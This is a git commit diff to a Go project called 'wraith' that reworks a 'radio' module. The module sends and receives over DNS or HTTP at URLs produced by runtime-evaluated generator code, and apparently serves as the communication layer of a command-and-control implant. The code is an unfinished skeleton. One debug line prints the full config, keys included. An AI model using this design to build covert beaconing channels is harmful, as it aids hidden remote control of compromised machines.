885388d591712607c9150e3f423a55da2fe18800
TR-SLimey <37966924+TR-SLimey@users.noreply.github.com>
2020-12-24 13:17:31 +0000

    Various work on the radio module

--- wraith/radio/radio.go
+++ wraith/radio/radio.go
@@ -2,6 +2,7 @@ package radio
 
 import (
 	"fmt"
+	"net/url"
 
 	"github.com/TR-SLimey/wraith/config"
 	"github.com/TR-SLimey/wraith/radio/frequencies"
@@ -11,12 +12,12 @@ import (
 func NewRadio() Radio {
 	r := Radio{
 		Transmitter: Antenna{
-			URLGenerator: config.Config.Radio.Transmitter.DefaultURLGenerator,
-			Interval:     config.Config.Radio.Transmitter.DefaultIntervalSeconds,
+			URLGenerator:         config.Config.Radio.Transmitter.URLGenerator,
+			TriggerCheckInterval: config.Config.Radio.Transmitter.TriggerCheckInterval,
 		},
 		Receiver: Antenna{
-			URLGenerator: config.Config.Radio.Receiver.DefaultURLGenerator,
-			Interval:     config.Config.Radio.Receiver.DefaultIntervalSeconds,
+			URLGenerator:         config.Config.Radio.Receiver.URLGenerator,
+			TriggerCheckInterval: config.Config.Radio.Receiver.TriggerCheckInterval,
 		},
 		FrequencyMap: make(map[string]Frequency),
 	}
@@ -32,21 +33,31 @@ func NewRadio() Radio {
 	r.FrequencyMap["dns"] = frequencies.DNS{}
 	r.FrequencyMap["http"] = frequencies.HTTP{}
 	r.FrequencyMap["https"] = r.FrequencyMap["http"]
+
+	r.TransmitQueue = make(chan []byte)
+	r.ReceiveQueue = make(chan []byte)
+
+	r.RunFlag = true
+
 	return r
 }
 
 type Radio struct {
-	Transmitter  Antenna
-	Receiver     Antenna
-	FrequencyMap map[string]Frequency
+	Transmitter   Antenna
+	Receiver      Antenna
+	TransmitQueue chan []byte
+	ReceiveQueue  chan []byte
+	RunFlag       bool
+	FrequencyMap  map[string]Frequency
 }
 
 type Antenna struct {
-	URLGenerator  string
-	Interval      int
-	LastTimestamp int
-	LastURL       string
-	Crypto        struct {
+	URLGenerator         string
+	Trigger              string
+	TriggerCheckInterval int
+	LastTimestamp        int
+	LastURL              string
+	Crypto               struct {
 		Enabled bool
 		Type    int
 		Key     string
@@ -59,6 +70,8 @@ type Antenna struct {
 }
 
 type Frequency interface {
+	Transmit(string, []byte) error
+	Receive(string) ([]byte, error)
 }
 
 func (r *Radio) GenerateRadioURL(urltype int) (string, error) {
@@ -70,9 +83,10 @@ func (r *Radio) GenerateRadioURL(urltype int) (string, error) {
 	} else {
 		return "", fmt.Errorf("invalid urltype")
 	}
-	// Use yaegi to run function to generate the next check URL
+	// Use yaegi to run function to generate the next URL
 	i := interp.New(interp.Options{})
 	_, err := i.Eval(r.Transmitter.URLGenerator)
+	fmt.Printf("# %v\n", config.Config)
 	if err != nil {
 		return "", err
 	}
@@ -86,10 +100,62 @@ func (r *Radio) GenerateRadioURL(urltype int) (string, error) {
 	return result, nil
 }
 
-func MakeDNSRequest(dnsname, record string) string {
-	return "a"
+func CheckCommsTrigger(commtype int) (bool, error) {
+	return true, nil
 }
 
-func (r *Radio) Check() error {
+func (r *Radio) Transmit() error {
+	// Generate URL
+	transmitAddr, err := r.GenerateRadioURL(0)
+	if err != nil {
+		return err
+	}
+	// Parse the URL for the protocol
+	parsed, err := url.Parse(transmitAddr)
+	if err != nil {
+		return err
+	}
+	if freq, exists := r.FrequencyMap[parsed.Scheme]; exists {
+		err := freq.Transmit(transmitAddr, []byte{})
+		if err != nil {
+			return err
+		}
+	} else {
+		return fmt.Errorf("no frequency supports the scheme `%s`", parsed.Scheme)
+	}
 	return nil
+}
+
+func (r *Radio) Receive() error {
+	// Generate URL
+	receiveAddr, err := r.GenerateRadioURL(1)
+	if err != nil {
+		return err
+	}
+	// Parse the URL for the protocol
+	parsed, err := url.Parse(receiveAddr)
+	if err != nil {
+		return err
+	}
+	if freq, exists := r.FrequencyMap[parsed.Scheme]; exists {
+		_, err := freq.Receive(receiveAddr)
+		if err != nil {
+			return err
+		}
+	} else {
+		return fmt.Errorf("no frequency supports the scheme `%s`", parsed.Scheme)
+	}
+	return nil
+}
+
+func (r *Radio) RunTransmit() {
+	for r.RunFlag {
+		r.Transmit()
+	}
+}
+
+func (r *Radio) RunReceive() {
+	for r.RunFlag {
+		r.Receive()
+	}
 }
